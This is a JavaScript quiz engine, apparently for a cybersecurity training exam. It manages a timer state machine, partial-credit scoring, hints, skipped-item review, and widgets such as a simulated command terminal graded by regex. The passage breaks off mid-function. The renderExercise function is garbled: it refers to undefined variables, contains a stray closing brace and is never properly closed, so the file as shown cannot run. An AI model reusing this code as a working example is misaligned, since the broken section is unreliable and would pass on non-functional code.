function scoreExercise(H, W, N) { if (!N) { return 0; } return Math.max(0, (H - W) / N); }
function hintAdjusted(credit) { return Math.max(0, credit - 0.10); }

/* ---------------- exam state ---------------- */
var S = {
  phase: 'intro',            /* intro | exam | review | results */
  order: [], pos: 0,
  rec: {},                   /* id -> {credit, answered, hintUsed, skipped} */
  skipped: [],
  reviewingFrom: null,
  timer: 'RUNNING',          /* RUNNING | PAUSED_MANUAL | PAUSED_AUTO_CHECK | ENDED */
  manualBefore: null,
  remaining: CFG.seconds,
  pauseManualSec: 0, pauseAutoSec: 0, pauseSince: null,
  creditSum: 0, answered: 0,
  reported: false,
  user: null,
  flow: {},                  /* id -> {step, choices[], done} */
  exRemaining: null,         /* per-exercise countdown (seconds) for EXTREMELY HARD terminal */
  widget: null, checked: false, notice: null
};
var ticker = null;

function currentId() { return S.order[S.pos]; }

/* ---------------- timer state machine ---------------- */
/* States: RUNNING, PAUSED_MANUAL, PAUSED_AUTO_CHECK, ENDED (explicit, testable transitions) */
function setTimerState(st) {
  if (S.timer === st) { return; }
  if (S.pauseSince) {
    var d = Math.floor((Date.now() - S.pauseSince.at) / 1000);
    if (S.pauseSince.kind === 'manual') { S.pauseManualSec += d; } else { S.pauseAutoSec += d; }
    S.pauseSince = null;
  }
  if (st === 'PAUSED_MANUAL') { S.pauseSince = { kind: 'manual', at: Date.now() }; }
  if (st === 'PAUSED_AUTO_CHECK') { S.pauseSince = { kind: 'auto', at: Date.now() }; }
  S.timer = st;
  renderHeader();
}
function stateLabel(st) {
  if (st === 'RUNNING') { return '<span class="tstate tstate-run">▶ RUNNING</span>'; }
  if (st === 'PAUSED_MANUAL') { return '<span class="tstate tstate-man">⏸ PAUSED — manual (press Resume)</span>'; }
  if (st === 'PAUSED_AUTO_CHECK') { return '<span class="tstate tstate-auto">⏸ PAUSED — reviewing feedback (resumes on Next)</span>'; }
  return '<span class="tstate tstate-end">⏹ ENDED</span>';
}
function tick() {
  if ((S.phase !== 'exam' && S.phase !== 'review') || S.timer !== 'RUNNING') { return; }
  S.remaining -= 1;
  if (S.exRemaining != null) {
    S.exRemaining -= 1;
    var tb = $('#exTimebox');
    if (tb) { tb.textContent = '⏱ Exercise timer: ' + fmtClock(S.exRemaining); }
    if (S.exRemaining <= 0) { expireExercise(); return; }
  }
  if (S.remaining <= 0) {
    S.remaining = 0;
    setTimerState('ENDED');
    finishExam('The exam timer reached zero. Exercises you never answered were excluded from the score.');
    return;
  }
  renderHeader();
}
function startTicker() { if (!ticker) { ticker = setInterval(tick, 1000); } }

/* ---------------- header ---------------- */
function renderHeader() {
  var c = $('#hdrCounter');
  if (S.phase === 'exam') { c.textContent = 'Exercise ' + (S.pos + 1) + ' of ' + S.order.length; }
  else if (S.phase === 'review') { c.textContent = 'Review skipped exercises'; }
  else if (S.phase === 'results') { c.textContent = 'Final results'; }
  else { c.textContent = 'Introduction'; }
  $('#hdrTimer').textContent = '⏱ ' + fmtClock(S.remaining);
  $('#hdrTimerState').innerHTML = stateLabel(S.timer);
  var pct = S.answered > 0 ? Math.round((S.creditSum / S.answered) * 100) : 0;
  $('#hdrScore').textContent = 'Score ' + round1(S.creditSum) + ' / ' + S.answered + ' (' + pct + '%)';
  var hintBtn = $('#btnHint'), skipBtn = $('#btnSkip'), pauseBtn = $('#btnPause');
  hintBtn.disabled = (S.phase !== 'exam') || S.checked || (S.rec[currentId()] ? S.rec[currentId()].hintUsed : false);
  skipBtn.disabled = (S.phase !== 'exam') || S.checked;
  pauseBtn.textContent = (S.timer === 'PAUSED_MANUAL') ? '▶ Resume' : '⏸ Pause';
  pauseBtn.disabled = (S.phase !== 'exam');
}

/* ---------------- intro screen ---------------- */
function renderIntro() {
  S.phase = 'intro';
  $('#hdr').classList.add('hidden');
  var stage = $('#stage');
  stage.innerHTML = '';
  var sheet = el('div', 'sheet');
  sheet.appendChild(el('h1', null, esc(CFG.introTitle)));
  var chips = el('div', 'metachips');
  [['badge', CFG.severity], ['chip', DATA.exercises.length + ' exercises'], ['chip', 'Pass mark: 70%'],
   ['chip', 'Time limit: ' + CFG.minutes + ' minutes'], ['chip', 'MITRE ATT&CK ' + CFG.objectId]].forEach(function (m) {
    chips.appendChild(el(m[0] === 'badge' ? 'span' : 'span', m[0] === 'badge' ? badgeClass() : 'mchip', esc(m[1])));
  });
  sheet.appendChild(chips);
  if (S.user) { sheet.appendChild(el('p', 'small', 'Candidate: ' + esc(S.user))); }

  var ex = el('div', null, DATA.intro.entityHtml);
  sheet.appendChild(ex);
  sheet.appendChild(el('h2', null, 'Related concepts covered in this exam (Keywords Covered)'));
  DATA.keywords.forEach(function (th) {
    var t = el('div', 'kwtheme');
    t.appendChild(el('h3', null, esc(th.theme)));
    var kc = el('div', 'kwchips');
    th.chips.forEach(function (c) { kc.appendChild(el('span', 'kw', esc(c))); });
    t.appendChild(kc);
    sheet.appendChild(t);
  });

  sheet.appendChild(el('h2', null, 'How this exam works'));
  sheet.appendChild(el('div', null, DATA.intro.rulesHtml));

  var nav = el('div', 'navrow');
  var start = el('button', 'btn btn-primary', 'Start the exam');
  start.type = 'button';
  start.addEventListener('click', startExam);
  nav.appendChild(start);
  sheet.appendChild(nav);
  stage.appendChild(sheet);
  window.scrollTo(0, 0);
}

/* ---------------- exam flow ---------------- */
function resetAttemptState() {
  S.order = shuffle(DATA.exercises.map(function (e) { return e.id; }));
  S.pos = 0; S.rec = {}; S.skipped = []; S.reviewingFrom = null;
  S.remaining = CFG.seconds; S.pauseManualSec = 0; S.pauseAutoSec = 0; S.pauseSince = null;
  S.creditSum = 0; S.answered = 0; S.flow = {}; S.exRemaining = null;
  S.widget = null; S.checked = false; S.notice = null;
  DATA.exercises.forEach(function (e) { S.rec[e.id] = { credit: null, answered: false, hintUsed: false, skipped: false }; });
}
function startExam() {
  resetAttemptState();
  S.phase = 'exam';
  $('#hdr').classList.remove('hidden');
  setTimerState('RUNNING');
  startTicker();
  renderExercise();
}
function retake() {
  S.reported = false;
  resetAttemptState();
  S.phase = 'exam';
  $('#hdr').classList.remove('hidden');
  setTimerState('RUNNING');
  renderExercise();
}
function finishExam(note) {
  S.phase = 'results';      /* set before setTimerState so the header renders "Final results" */
  setTimerState('ENDED');
  renderResults(note);
  reportScore();
}
function timeUpNote() { return null; }

/* expose part A to part B (same IIFE is concatenated, so direct scope sharing) */

/* Cyber Pulse Academy exam engine — part B (widgets, feedback, screens, reporting) */

/* ---------------- manual pause overlay ---------------- */
function onPauseBtn() {
  if (S.phase !== 'exam') { return; }
  if (S.timer === 'PAUSED_MANUAL') {
    var prior = S.manualBefore || 'RUNNING';
    S.manualBefore = null;
    $('#pauseOverlay').classList.add('hidden');
    setTimerState(prior);
  } else if (S.timer === 'RUNNING' || S.timer === 'PAUSED_AUTO_CHECK') {
    S.manualBefore = S.timer;
    setTimerState('PAUSED_MANUAL');
    $('#pauseOverlay').classList.remove('hidden');
    try { $('#btnResume').focus(); } catch (e) { /* focus move is progressive enhancement */ }
  }
}

/* ---------------- widget: qcm (single + multi) ---------------- */
function buildQcm(ex, root, checkBtn, multi) {
  var letters = 'ABCDEFGHIJ';
  var view = shuffle(ex.data.options.map(function (o, i) { return { i: i, t: o.t, correct: !!o.correct, why: o.why }; }));
  var sel = {};
  var list = el('div', 'optlist');
  var btns = [];
  view.forEach(function (o, vi) {
    var b = el('button', 'opt');
    b.type = 'button';
    b.innerHTML = '<span class="opt-label">' + letters[vi] + '.</span><span class="opt-text">' + esc(o.t) + '</span>';
    b.addEventListener('click', function () {
      if (S.checked) { return; }
      if (multi) {
        sel[vi] = !sel[vi];
        b.classList.toggle('sel', !!sel[vi]);
      } else {
        sel = {};
        btns.forEach(function (x) { x.classList.remove('sel'); });
        sel[vi] = true;
        b.classList.add('sel');
      }
      var any = false;
      Object.keys(sel).forEach(function (k) { if (sel[k]) { any = true; } });
      checkBtn.disabled = !any;
    });
    btns.push(b);
    list.appendChild(b);
  });
  root.appendChild(list);
  function lab(o, vi) { return letters[vi] + '. ' + o.t; }
  return {
    grade: function () {
      var chosen = [];
      view.forEach(function (o, vi) { if (sel[vi]) { chosen.push({ o: o, vi: vi }); } });
      if (!multi) {
        if (chosen.length === 0) {
          return { H: 0, W: 0, N: 1, items: [{ state: 'missed', label: 'No option was selected', why: 'Nothing was chosen when Check was pressed.' }] };
        }
        var c = chosen[0];
        if (c.o.correct) { return { H: 1, W: 0, N: 1, items: [{ state: 'correct', label: lab(c.o, c.vi), why: c.o.why }] }; }
        var right = null, rightVi = 0;
        view.forEach(function (o, vi) { if (o.correct) { right = o; rightVi = vi; } });
        return { H: 0, W: 1, N: 1, items: [
          { state: 'wrong', label: lab(c.o, c.vi), why: c.o.why },
          { state: 'missed', label: lab(right, rightVi), why: right.why }
        ] };
      }
      var H = 0, W = 0, N = 0, items = [];
      view.forEach(function (o, vi) {
        var wasSel = !!sel[vi];
        if (o.correct) {
          N++;
          if (wasSel) { H++; items.push({ state: 'correct', label: lab(o, vi), why: o.why }); }
          else { items.push({ state: 'missed', label: lab(o, vi), why: o.why }); }
        } else if (wasSel) {
          W++; items.push({ state: 'wrong', label: lab(o, vi), why: o.why });
        }
      });
      return { H: H, W: W, N: N, items: items };
    }
  };
}

/* ---------------- widget: chip yard (match + categorize) ---------------- */
function buildPlace(ex, root, checkBtn) {
  var d = ex.data;
  var isMatch = ex.type === 'match';
  var items = shuffle(d.items.map(function (o, i) { return { i: i, t: o.t, target: o.target, why: o.why }; }));
  var assign = {};
  var picked = null;
  var chipEls = {}, zoneSlots = [], zoneEmpties = [];
  var bankChips = el('div', 'bank-chips');

  var zonesWrap = el('div', 'yard-zones');
  d.zones.forEach(function (z, zi) {
    var zone = el('div', isMatch ? 'yzone matchrow' : 'yzone');
    var title = el('p', 'yzone-title', esc(z.title));
    var slots = el('div', 'yzone-slots');
    var empty = el('span', null, isMatch ? 'Tap a chip, then tap here' : 'Drop matching chips here');
    empty.style.cssText = 'color:#7a87a0;font-size:13px;align-self:center';
    slots.appendChild(empty);
    zone.addEventListener('dragover', function (ev) { ev.preventDefault(); zone.classList.add('over'); });
    zone.addEventListener('dragleave', function () { zone.classList.remove('over'); });
    zone.addEventListener('drop', function (ev) {
      ev.preventDefault(); zone.classList.remove('over');
      var idx = ev.dataTransfer.getData('text/plain');
      if (idx !== '') { place(parseInt(idx, 10), zi); }
    });
    zone.addEventListener('click', function (ev) {
      if (ev.target !== zone && ev.target !== slots && ev.target !== title && ev.target !== empty) { return; }
      if (picked != null) { place(picked, zi); }
    });
    zone.tabIndex = 0;
    zone.setAttribute('role', 'button');
    zone.setAttribute('aria-label', 'Drop target: ' + z.title + '. Select a chip, then press Enter here to place it.');
    zone.addEventListener('keydown', function (ev) {
      if (ev.key === 'Enter' || ev.key === ' ') { ev.preventDefault(); if (picked != null) { place(picked, zi); } }
    });
    if (isMatch) {
      zone.appendChild(title); zone.appendChild(slots);
    } else {
      zone.appendChild(title); zone.appendChild(slots);
    }
    zoneSlots[zi] = slots; zoneEmpties[zi] = empty;
    zonesWrap.appendChild(zone);
  });

  items.forEach(function (it) {
    var chip = el('button', 'chip', esc(it.t));
    chip.type = 'button';
    chip.draggable = true;
    chip.addEventListener('dragstart', function (ev) { ev.dataTransfer.setData('text/plain', String(it.i)); });
    chip.addEventListener('click', function () {
      if (S.checked) { return; }
      if (assign[it.i] !== undefined) { assign[it.i] = undefined; picked = null; renderAll(); return; }
      picked = (picked === it.i) ? null : it.i;
      renderAll();
    });
    chipEls[it.i] = chip;
  });

  function place(itemIdx, zoneIdx) {
    if (S.checked) { return; }
    assign[itemIdx] = zoneIdx;
    picked = null;
    renderAll();
  }
  function renderAll() {
    d.zones.forEach(function (z, zi) { zoneSlots[zi].innerHTML = ''; zoneSlots[zi].appendChild(zoneEmpties[zi]); });
    bankChips.innerHTML = '';
    items.forEach(function (it) {
      var chip = chipEls[it.i];
      chip.classList.toggle('pick', picked === it.i);
      chip.setAttribute('aria-pressed', picked === it.i ? 'true' : 'false');
      if (assign[it.i] === undefined) { bankChips.appendChild(chip); }
      else { zoneSlots[assign[it.i]].appendChild(chip); }
    });
    d.zones.forEach(function (z, zi) {
      zoneEmpties[zi].style.display = (zoneSlots[zi].children.length > 1) ? 'none' : 'inline';
    });
    var count = 0;
    Object.keys(assign).forEach(function (k) { if (assign[k] !== undefined) { count++; } });
    checkBtn.disabled = (count === 0);
  }

  var bank = el('div', 'bank');
  bank.appendChild(el('p', 'bank-title', 'Chips — tap one, then tap a target'));
  bank.appendChild(bankChips);
  bank.addEventListener('dragover', function (ev) { ev.preventDefault(); });
  bank.addEventListener('drop', function (ev) {
    ev.preventDefault();
    var idx = ev.dataTransfer.getData('text/plain');
    if (idx !== '') { assign[parseInt(idx, 10)] = undefined; picked = null; renderAll(); }
  });
  var yard = el('div', 'yard');
  yard.appendChild(zonesWrap); yard.appendChild(bank);
  root.appendChild(yard);
  renderAll();

  return {
    grade: function () {
      var H = 0, W = 0, N = items.length, fb = [];
      items.forEach(function (it) {
        var a = assign[it.i];
        if (a === undefined) { fb.push({ state: 'missed', label: it.t, why: it.why }); }
        else if (a === it.target) { H++; fb.push({ state: 'correct', label: it.t + ' → ' + d.zones[a].title, why: it.why }); }
        else { W++; fb.push({ state: 'wrong', label: it.t + ' → ' + d.zones[a].title, why: it.why }); }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: ordering ---------------- */
function buildOrder(ex, root, checkBtn) {
  var correct = ex.data.items;
  var view = shuffle(correct.map(function (o, i) { return { i: i, t: o.t, why: o.why }; }));
  var list = el('div', 'ordlist');
  var rows = [];
  function rerender() {
    list.innerHTML = '';
    view.forEach(function (it, idx) {
      var row = rows[it.i];
      row._pos = idx;
      list.appendChild(row);
    });
  }
  view.forEach(function (it) {
    var row = el('div', 'ord-row');
    row.setAttribute('draggable', 'true');
    row.innerHTML = '<span class="ord-handle" aria-hidden="true">≡</span><span class="ord-text">' + esc(it.t) + '</span>';
    var up = el('button', 'ord-btn', '▲'); up.type = 'button'; up.setAttribute('aria-label', 'Move up');
    var down = el('button', 'ord-btn', '▼'); down.type = 'button'; down.setAttribute('aria-label', 'Move down');
    up.addEventListener('click', function () { if (S.checked) { return; } var p = row._pos; if (p > 0) { var t = view[p - 1]; view[p - 1] = view[p]; view[p] = t; rerender(); } });
    down.addEventListener('click', function () { if (S.checked) { return; } var p = row._pos; if (p < view.length - 1) { var t = view[p + 1]; view[p + 1] = view[p]; view[p] = t; rerender(); } });
    row.appendChild(up); row.appendChild(down);
    row.addEventListener('dragstart', function (ev) { ev.dataTransfer.setData('text/plain', String(row._pos)); row.classList.add('dragging'); });
    row.addEventListener('dragend', function () { row.classList.remove('dragging'); });
    row.addEventListener('dragover', function (ev) { ev.preventDefault(); });
    row.addEventListener('drop', function (ev) {
      ev.preventDefault();
      if (S.checked) { return; }
      var from = parseInt(ev.dataTransfer.getData('text/plain'), 10);
      var to = row._pos;
      if (!isNaN(from) && from !== to) {
        var moved = view.splice(from, 1)[0];
        view.splice(to, 0, moved);
        rerender();
      }
    });
    rows[it.i] = row;
  });
  rerender();
  root.appendChild(list);
  checkBtn.disabled = false;
  return {
    grade: function () {
      var H = 0, W = 0, N = view.length, fb = [];
      view.forEach(function (it, p) {
        var ok = (it.i === p);
        if (ok) { H++; } else { W++; }
        fb.push({
          state: ok ? 'correct' : 'wrong',
          label: 'Position ' + (p + 1) + ': ' + it.t,
          why: ok ? it.why : (it.why + ' (Correct position: ' + (it.i + 1) + '. In that slot the item was: ' + correct[p].t + '.)')
        });
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: fill in the blanks ---------------- */
function buildFill(ex, root, checkBtn) {
  var d = ex.data;
  var bank = shuffle(d.blanks.map(function (b) { return b.answer; }).concat(d.bank || []));
  var wrap = el('div', 'fillwrap');
  var sels = {};
  var parts = d.textWithBlanks.split(/\{(\d+)\}/g);
  function makeSelect(n) {
    var s = document.createElement('select');
    s.setAttribute('aria-label', 'Blank ' + n);
    s.appendChild(new Option('— choose —', ''));
    bank.forEach(function (o) { s.appendChild(new Option(o, o)); });
    s.addEventListener('change', function () {
      var any = false;
      Object.keys(sels).forEach(function (k) { if (sels[k].value) { any = true; } });
      checkBtn.disabled = !any;
    });
    return s;
  }
  for (var i = 0; i < parts.length; i++) {
    if (i % 2 === 0) { wrap.appendChild(document.createTextNode(parts[i])); }
    else {
      var n = parseInt(parts[i], 10);
      var s = makeSelect(n);
      sels[n] = s;
      wrap.appendChild(s);
    }
  }
  root.appendChild(wrap);
  return {
    grade: function () {
      var H = 0, W = 0, N = d.blanks.length, fb = [];
      d.blanks.forEach(function (b, bi) {
        var v = sels[bi + 1] ? sels[bi + 1].value : '';
        if (!v) { fb.push({ state: 'missed', label: 'Blank ' + (bi + 1) + ' → ' + b.answer, why: b.why }); }
        else if (v === b.answer) { H++; fb.push({ state: 'correct', label: 'Blank ' + (bi + 1) + ' → ' + b.answer, why: b.why }); }
        else { W++; fb.push({ state: 'wrong', label: 'Blank ' + (bi + 1) + ': you chose “' + v + '” → correct: ' + b.answer, why: b.why }); }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: ranking ---------------- */
function buildRank(ex, root, checkBtn) {
  /* shuffle display order so the stored rank order never leaks the answer */
  var items = shuffle(ex.data.items.map(function (o) { return { t: o.t, rank: o.rank, why: o.why }; }));
  var wrap = el('div');
  var sels = [];
  items.forEach(function (it, i) {
    var row = el('div', 'rankrow');
    row.appendChild(el('span', 'rank-text', esc(it.t)));
    var s = document.createElement('select');
    s.setAttribute('aria-label', 'Rank for: ' + it.t);
    s.appendChild(new Option('— rank —', ''));
    for (var r = 1; r <= items.length; r++) { s.appendChild(new Option(String(r), String(r))); }
    s.addEventListener('change', function () {
      var any = false;
      sels.forEach(function (x) { if (x.value) { any = true; } });
      checkBtn.disabled = !any;
    });
    sels.push(s);
    row.appendChild(s);
    wrap.appendChild(row);
  });
  root.appendChild(wrap);
  return {
    grade: function () {
      var H = 0, W = 0, N = items.length, fb = [];
      items.forEach(function (it, i) {
        var v = sels[i].value;
        if (!v) { fb.push({ state: 'missed', label: 'Rank ' + it.rank + ' → ' + it.t, why: it.why }); }
        else if (parseInt(v, 10) === it.rank) { H++; fb.push({ state: 'correct', label: 'Rank ' + it.rank + ' → ' + it.t, why: it.why }); }
        else { W++; fb.push({ state: 'wrong', label: 'You ranked ' + v + ': ' + it.t + ' → correct rank: ' + it.rank, why: it.why }); }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

/* ---------------- widget: terminal ---------------- */
function normCmd(s) { return String(s || '').trim().toLowerCase().replace(/\s+/g, ' '); }
function buildTerminal(ex, root, checkBtn) {
  var d = ex.data;
  root.appendChild(el('div', 'small', 'Type the command, press Run to see the lab answer, then press Check to grade it. Nothing real is executed.'));
  if (d.notice) { root.appendChild(el('div', 'timebox', esc(d.notice))); }
  var box = el('div', 'term');
  var scroll = el('pre', 'term-scroll');
  scroll.textContent = (d.banner || []).join('\n');
  var prow = el('div', 'term-prompt');
  var lab = el('label', null, esc(d.prompt));
  lab.setAttribute('for', 'termIn');
  var inp = document.createElement('input');
  inp.className = 'term-in'; inp.id = 'termIn'; inp.type = 'text';
  inp.autocomplete = 'off'; inp.spellcheck = false;
  inp.setAttribute('aria-label', 'Command line input');
  var run = el('button', 'term-run', 'Run');
  run.type = 'button';
  prow.appendChild(lab); prow.appendChild(inp); prow.appendChild(run);
  box.appendChild(scroll); box.appendChild(prow);
  root.appendChild(box);
  if (d.syntax) {
    var sp = el('div', 'synpanel');
    sp.appendChild(el('h4', null, 'Syntax reminder'));
    sp.appendChild(el('div', null, d.syntax.note));
    sp.appendChild(el('p', 'syn-ex', 'Example on a different target: <code>' + esc(d.syntax.example) + '</code>'));
    sp.appendChild(el('p', 'syn-ex', 'Expected output shape: <code>' + esc(d.syntax.sampleOut) + '</code>'));
    root.appendChild(sp);
  }
  function runCmd() {
    var v = inp.value;
    scroll.textContent += '\n' + d.prompt + ' ' + v + '\n';
    var n = normCmd(v);
    if (n && d.simMatch && new RegExp(d.simMatch).test(n)) {
      (d.sim || []).forEach(function (l) { scroll.textContent += l + '\n'; });
    } else if (n) {
      scroll.textContent += 'command not found: ' + v.trim().split(/\s+/)[0] + ' — this lab recognises only the command expected here.\n';
    }
    scroll.scrollTop = scroll.scrollHeight;
    if (n) { checkBtn.disabled = false; }
  }
  run.addEventListener('click', runCmd);
  inp.addEventListener('keydown', function (ev) { if (ev.key === 'Enter') { runCmd(); } });
  return {
    typed: function () { return normCmd(inp.value); },
    grade: function () {
      var n = normCmd(inp.value);
      var H = 0, W = 0, items = [];
      if (!n) {
        return { H: 0, W: 0, N: d.elements.length, items: [{ state: 'missed', label: 'No command was typed', why: 'The input was empty at Check time.' }] };
      }
      d.elements.forEach(function (eDef) {
        if (new RegExp(eDef.re).test(n)) { H++; items.push({ state: 'correct', label: eDef.label, why: eDef.why }); }
        else { items.push({ state: 'missed', label: eDef.label, why: eDef.why }); }
      });
      (d.danger || []).forEach(function (dg) {
        if (new RegExp(dg.re).test(n)) { W++; items.push({ state: 'wrong', label: dg.label, why: dg.why }); }
      });
      return { H: H, W: W, N: d.elements.length, items: items };
    }
  };
}

/* ---------------- widget: branching flow ---------------- */
function buildFlow(ex, root, checkBtn) {
  var steps = ex.data.steps;
  var letters = 'ABCDEF';
  var st = { step: 0, choices: [] };
  S.flow[ex.id] = st;
  var holder = el('div');
  root.appendChild(holder);
  function renderStep() {
    holder.innerHTML = '';
    if (st.step >= steps.length) {
      holder.appendChild(el('div', 'notice', 'All steps are taken. Press Check to grade the complete path you chose.'));
      checkBtn.disabled = false;
      return;
    }
    var s = steps[st.step];
    holder.appendChild(el('span', 'step-tag', 'STEP ' + (st.step + 1) + ' OF ' + steps.length));
    (s.text || []).forEach(function (t) { holder.appendChild(el('p', 'flow-text', t)); });
    (s.artefacts || []).forEach(function (a) { holder.appendChild(artefactNode(a)); });
    var list = el('div', 'optlist');
    shuffle(s.options).forEach(function (o, oi) {
      var b = el('button', 'opt');
      b.type = 'button';
      b.innerHTML = '<span class="opt-label">' + letters[oi] + '.</span><span class="opt-text">' + esc(o.t) + '</span>';
      b.addEventListener('click', function () {
        if (S.checked) { return; }
        st.choices[st.step] = o;
        st.step += 1;
        renderStep();
      });
      list.appendChild(b);
    });
    holder.appendChild(list);
  }
  renderStep();
  return {
    grade: function () {
      var H = 0, W = 0, N = steps.length, fb = [];
      steps.forEach(function (s, i) {
        var ch = st.choices[i];
        var right = null;
        s.options.forEach(function (o) { if (o.correct) { right = o; } });
        if (ch && ch.correct) {
          H++; fb.push({ state: 'correct', label: 'Step ' + (i + 1) + ': ' + ch.t, why: ch.why });
        } else {
          W++; fb.push({
            state: 'wrong',
            label: 'Step ' + (i + 1) + ': ' + (ch ? ch.t : '(no choice)'),
            why: (ch ? ch.why + ' ' : '') + 'Better: ' + right.t + ' — ' + right.why
          });
        }
      });
      return { H: H, W: W, N: N, items: fb };
    }
  };
}

function buildWidget(ex, root, checkBtn) {
  if (ex.type === 'qcm') { return buildQcm(ex, root, checkBtn, false); }
  if (ex.type === 'qcm-multi') { return buildQcm(ex, root, checkBtn, true); }
  if (ex.type === 'match' || ex.type === 'categorize') { return buildPlace(ex, root, checkBtn); }
  if (ex.type === 'order') { return buildOrder(ex, root, checkBtn); }
  if (ex.type === 'fill') { return buildFill(ex, root, checkBtn); }
  if (ex.type === 'rank') { return buildRank(ex, root, checkBtn); }
  if (ex.type === 'terminal') { return buildTerminal(ex, root, checkBtn); }
  if (ex.type === 'flow') { return buildFlow(ex, root, checkBtn); }
  return buildQcm(ex, root, checkBtn, false);
}

/* ---------------- exercise screen ---------------- */
function renderExercise() {
  S.phase = 'exam';
  S.checked = false;
  S.widget = null;
  var id = currentId();
  var ex = byId(id);
  var stage = $('#stage');
  stage.innerHTML = '';
  if (S.notice) { stage.appendChild(el('div', 'notice', esc(S.notice))); S.notice = null; }

  scn.appendChild(sum);
  var scnBody = el('div', 'scn-body');

  }

  var hintArea = el('div');
  hintArea.id = 'hintArea';
  hintArea.setAttribute('aria-live', 'polite');
  ab.appendChild(hintArea);
  var fbAnchor = el('div');
  fbAnchor.id = 'fbAnchor';
  fbAnchor.setAttribute('aria-live', 'polite');

  renderHeader();
  window.scrollTo(0, 0);
  try { sum.focus({ preventScroll: true }); } catch (e) { /* focus move is progressive enhancement */ }

/* ---------------- check + feedback ---------------- */
function onCheck() {
  if (S.checked || !S.widget) { return; }
  setTimerState('PAUSED_AUTO_CHECK'); /* first action: stop the clock before rendering feedback */
  var ex = byId(currentId());
  var g = S.widget.grade();
  var credit = scoreExercise(g.H, g.W, g.N);
  var rec = S.rec[currentId()];
  if (rec.hintUsed) { credit = hintAdjusted(credit); }
  rec.credit = credit;
  rec.answered = true;
  S.creditSum += credit;
  S.answered += 1;
  S.checked = true;
  S.exRemaining = null;
  var checkBtn = $('#btnCheck');
  if (checkBtn) { checkBtn.classList.add('hidden'); }
  renderFeedback(ex, g, credit, rec.hintUsed);
  renderHeader();
}
function renderFeedback(ex, g, credit, hintUsed) {
  var anchor = $('#fbAnchor');
  anchor.innerHTML = '';
  var cls = credit >= 1 ? 'fb-correct' : (credit > 0 ? 'fb-partial' : 'fb-wrong');
  var icon = credit >= 1 ? '✔ CORRECT' : (credit > 0 ? '◔ PARTIALLY CORRECT' : '✘ INCORRECT');
  var fb = el('section', 'block blk-feedback ' + cls);
  var head = el('div', 'fb-head', '<span>' + icon + '</span>');
  if (g.N > 1) {
    head.appendChild(el('span', 'fb-credit', 'credit ' + credit.toFixed(2) + ' — ' + g.H + '/' + g.N + ' items' + (hintUsed ? ' (after −0.10 hint penalty)' : '')));
  } else if (hintUsed) {
    head.appendChild(el('span', 'fb-credit', 'credit ' + credit.toFixed(2) + ' (after −0.10 hint penalty)'));
  }
  fb.appendChild(head);
  var body = el('div', 'fb-body');
  if (g.N > 1) {
    var ul = el('ul', 'fb-items');
    g.items.forEach(function (it) {
      var ic = it.state === 'correct' ? '<span class="ic-c">✓ Correct</span>'
        : (it.state === 'wrong' ? '<span class="ic-w">✗ Wrong</span>' : '<span class="ic-m">○ Missed</span>');
      ul.appendChild(el('li', 'fb-item', ic + '<span><b>' + esc(it.label) + '</b><br><span class="fb-why">' + esc(it.why) + '</span></span>'));
    });
    body.appendChild(ul);
  }
  body.appendChild(el('p', 'fb-expl', ex.explanation));
  if (ex.study) { body.appendChild(el('p', 'fb-study', 'What to study: ' + esc(ex.study))); }
  var nav = el('div', 'navrow');
  var label;
  if (S.reviewingFrom) { label = '↩ Return to review'; }
  else if (S.pos >= S.order.length - 1) { label = S.skipped.length ? 'Go to skipped review' : '🏁 Final Submit'; }
  else { label = 'Next ▶'; }
  var next = el('button', 'btn btn-blue', label);
  next.type = 'button';
  next.addEventListener('click', onNext);
  nav.appendChild(next);
  body.appendChild(nav);
  fb.appendChild(body);
  anchor.appendChild(fb);
  var motionOk = true;
  try { motionOk = !window.matchMedia('(prefers-reduced-motion: reduce)').matches; } catch (e) { /* default on */ }
  anchor.scrollIntoView({ behavior: motionOk ? 'smooth' : 'auto', block: 'nearest' });
}
function unansweredSkipped() {
  return S.skipped.filter(function (id) { return !S.rec[id].answered; });
}
function onNext() {
  if (S.reviewingFrom) {
    var rid = S.reviewingFrom;
    S.reviewingFrom = null;
    if (S.rec[rid].answered) {
      var si = S.skipped.indexOf(rid);
      if (si >= 0) { S.skipped.splice(si, 1); }
    }
    setTimerState('RUNNING');
    if (unansweredSkipped().length) { renderReview(); }
    else { finishExam(null); }
    return;
  }
  if (S.pos < S.order.length - 1) {
    S.pos += 1;
    setTimerState('RUNNING');
    renderExercise();
  } else if (unansweredSkipped().length) {
    setTimerState('RUNNING');
    renderReview();
  } else {
    finishExam(null);
  }
}

/* ---------------- skip / hint ---------------- */
function onSkip() {
  if (S.phase !== 'exam' || S.checked) { return; }
  var id = currentId();
  var rec = S.rec[id];
  if (!rec.skipped) {
    rec.skipped = true;
    if (S.skipped.indexOf(id) < 0) { S.skipped.push(id); }
  }
  S.exRemaining = null;
  if (S.reviewingFrom) {
    S.reviewingFrom = null;
    renderReview();
    return;
  }
  if (S.pos < S.order.length - 1) { S.pos += 1; renderExercise(); }
  else { renderReview(); }
}
function expireExercise() {
  S.exRemaining = null;
  S.notice = '⏱ That exercise ran out of its own timer and moved to the skipped pool. You can still answer it from the review screen while the exam timer runs.';
  onSkip();
}
function onHint() {
  if (S.phase !== 'exam' || S.checked) { return; }
  var rec = S.rec[currentId()];
  if (rec.hintUsed) { return; }
  rec.hintUsed = true;
  var ex = byId(currentId());
  var area = $('#hintArea');
  area.innerHTML = '';
  area.appendChild(el('div', 'hintline', '💡 Hint (−10% of this exercise’s credit): ' + esc(ex.hint)));
  renderHeader();
}

/* ---------------- review skipped ---------------- */
function renderReview() {
  S.phase = 'review';
  var stage = $('#stage');
  stage.innerHTML = '';
  var pool = unansweredSkipped();
  var sheet = el('div', 'sheet');
  sheet.appendChild(el('h1', null, 'Review skipped exercises'));
  sheet.appendChild(el('p', null, 'These exercises are not answered yet. They are excluded from your score until you answer them. You can come back as often as you want while the exam timer is still running.'));
  if (S.notice) { sheet.appendChild(el('div', 'notice', esc(S.notice))); S.notice = null; }
  if (!pool.length) {
    sheet.appendChild(el('div', 'notice', 'All skipped exercises have been answered. Finish the exam to see your results.'));
  }
  pool.forEach(function (id) {
    var ex = byId(id);
    var row = el('div', 'rev-row');
    row.appendChild(el('span', 'pill pill-excl', '⚠ NOT ANSWERED — EXCLUDED'));
    row.appendChild(el('span', 'rev-txt', esc(ex.summary)));
